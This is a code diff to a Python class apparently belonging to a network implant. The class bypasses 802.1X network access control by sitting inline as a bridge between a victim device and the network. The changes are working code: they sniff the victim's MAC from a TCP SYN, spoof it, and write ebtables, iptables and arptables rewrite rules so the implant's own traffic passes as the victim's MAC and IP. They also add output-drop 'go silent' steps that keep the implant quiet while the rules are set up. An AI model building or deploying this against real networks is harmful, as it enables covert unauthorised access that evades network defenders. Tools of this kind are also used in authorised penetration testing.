@@ -64,6 +64,7 @@ class NACBypass:
         self.discovery_timeout = nac_cfg.get("discovery_timeout", 120)
         self.ssh_callback_ip = nac_cfg.get("ssh_callback_ip", "")
         self.ssh_callback_port = nac_cfg.get("ssh_callback_port", 22)
+        self.nat_port_range = nac_cfg.get("nat_port_range", "61000-62000")
 
         self._running = False
         self._phase = "idle"
@@ -133,10 +134,10 @@ class NACBypass:
         return m.group(1) if m else None
 
     def _discover_downstream_mac(self) -> Optional[str]:
-        """Capture first Ethernet frame on the downstream interface to get its MAC."""
+        """Capture first TCP SYN on the downstream interface to get the victim MAC."""
         r = _run(
             f"timeout {min(self.discovery_timeout, 30)} "
-            f"tcpdump -i {self.downstream} -c 1 -e -nn -q",
+            f"tcpdump -i {self.downstream} -c 1 -e -nn 'tcp[13] & 2 != 0'",
             check=False,
         )
         output = r.stdout + r.stderr
@@ -180,6 +181,22 @@ class NACBypass:
 
     # ── Phase 3: active bypass ──
 
+    def _go_silent(self):
+        """Drop all outbound traffic while rewrite rules are being configured."""
+        logger.info("Going silent — dropping all OUTPUT traffic")
+        _run_quiet(f"arptables -A OUTPUT -o {self.upstream} -j DROP")
+        _run_quiet(f"arptables -A OUTPUT -o {self.downstream} -j DROP")
+        _run_quiet(f"iptables -A OUTPUT -o {self.upstream} -j DROP")
+        _run_quiet(f"iptables -A OUTPUT -o {self.downstream} -j DROP")
+
+    def _go_live(self):
+        """Remove the OUTPUT DROP rules to re-enable traffic."""
+        logger.info("Going live — removing OUTPUT DROP rules")
+        _run_quiet(f"arptables -D OUTPUT -o {self.upstream} -j DROP")
+        _run_quiet(f"arptables -D OUTPUT -o {self.downstream} -j DROP")
+        _run_quiet(f"iptables -D OUTPUT -o {self.upstream} -j DROP")
+        _run_quiet(f"iptables -D OUTPUT -o {self.downstream} -j DROP")
+
     def apply_rewrite_rules(self):
         """Set up ebtables + iptables so the implant can originate traffic."""
         if not self.victim_mac:
@@ -187,6 +204,17 @@ class NACBypass:
             return
         logger.info("Phase 3 — applying L2/L3 rewrite rules")
         self._phase = "active"
+
+        self._go_silent()
+
+        # Enable bridge-nf-call-iptables so iptables SNAT works on bridged traffic.
+        # Write state file so bridge_tap._sync_bridge_nf() preserves this setting.
+        _run_quiet("sysctl -w net.bridge.bridge-nf-call-iptables=1")
+        try:
+            from pathlib import Path
+            Path("/tmp/.raccoon_bridge_nf_state").write_text("1")
+        except Exception:
+            pass
 
         # Spoof the bridge MAC to match the victim
         _run_quiet(f"ip link set {self.bridge} down")
@@ -203,6 +231,12 @@ class NACBypass:
             f"-o {self.upstream} -j snat --to-source {self.victim_mac}"
         )
 
+        # Also rewrite on bridge interface (for locally-originated traffic)
+        _run_quiet(
+            f"ebtables -t nat -A POSTROUTING -s {self.implant_mac} "
+            f"-o {self.bridge} -j snat --to-source {self.victim_mac}"
+        )
+
         # Victim's real traffic passes through untouched (bridge forwards normally)
         # But traffic destined for the implant gets rewritten to our real MAC
         if self.gateway_mac:
@@ -216,21 +250,29 @@ class NACBypass:
         if self.victim_ip:
             _run_quiet(
                 f"iptables -t nat -A POSTROUTING -o {self.bridge} "
-                f"-j SNAT --to-source {self.victim_ip}"
+                f"-p tcp -j SNAT --to {self.victim_ip}:{self.nat_port_range}"
             )
-            logger.info("iptables SNAT to %s", self.victim_ip)
+            _run_quiet(
+                f"iptables -t nat -A POSTROUTING -o {self.bridge} "
+                f"-p udp -j SNAT --to {self.victim_ip}:{self.nat_port_range}"
+            )
+            _run_quiet(
+                f"iptables -t nat -A POSTROUTING -o {self.bridge} "
+                f"-p icmp -j SNAT --to {self.victim_ip}"
+            )
+            logger.info("iptables SNAT to %s:%s", self.victim_ip, self.nat_port_range)
 
         # ── arptables: rewrite ARP source to victim MAC ──
-        _run_quiet("arptables -F")
-        if self.victim_ip:
-            _run_quiet(
-                f"arptables -A OUTPUT -o {self.bridge} "
-                f"--opcode request -j mangle --mangle-mac-s {self.victim_mac}"
-            )
-            _run_quiet(
-                f"arptables -A OUTPUT -o {self.bridge} "
-                f"--opcode reply -j mangle --mangle-mac-s {self.victim_mac}"
-            )
+        _run_quiet(
+            f"arptables -A OUTPUT -o {self.bridge} "
+            f"--opcode request -j mangle --mangle-mac-s {self.victim_mac}"
+        )
+        _run_quiet(
+            f"arptables -A OUTPUT -o {self.bridge} "
+            f"--opcode reply -j mangle --mangle-mac-s {self.victim_mac}"
+        )
+
+        self._go_live()
 
         logger.info("NAC bypass active — implant can originate traffic as %s / %s",
                      self.victim_mac, self.victim_ip or "unknown IP")
@@ -292,17 +334,37 @@ class NACBypass:
         logger.info("Tearing down NAC bypass rules")
 
         _run_quiet("ebtables -t nat -F")
-        _run_quiet("ebtables -t filter -F")
         _run_quiet("iptables -t nat -F")
-        _run_quiet("arptables -F")
+        # Flush arptables mangle rules but keep filter intact
+        _run_quiet(
+            f"arptables -D OUTPUT -o {self.bridge} "
+            f"--opcode request -j mangle --mangle-mac-s {self.victim_mac}"
+        )
+        _run_quiet(
+            f"arptables -D OUTPUT -o {self.bridge} "
+            f"--opcode reply -j mangle --mangle-mac-s {self.victim_mac}"
+        )
+
+        # Restore bridge-nf-call-iptables to transparent bridging default
+        _run_quiet("sysctl -w net.bridge.bridge-nf-call-iptables=0")
+        try:
+            from pathlib import Path
+            state = Path("/tmp/.raccoon_bridge_nf_state")
+            if state.exists():
+                state.unlink()
+        except Exception:
+            pass
 
         if self.implant_mac:
             _run_quiet(f"ip link set {self.bridge} down")
             _run_quiet(f"ip link set dev {self.bridge} address {self.implant_mac}")
             _run_quiet(f"ip link set {self.bridge} up")
 
+        # Re-enable EAPOL forwarding (was not flushed from filter table)
+        self.enable_eapol_forwarding()
+
         self._phase = "idle"
-        logger.info("NAC bypass rules cleared, original MAC restored")
+        logger.info("NAC bypass rules cleared, original MAC restored, bridge transparent")
 
     @property
     def status(self) -> dict:
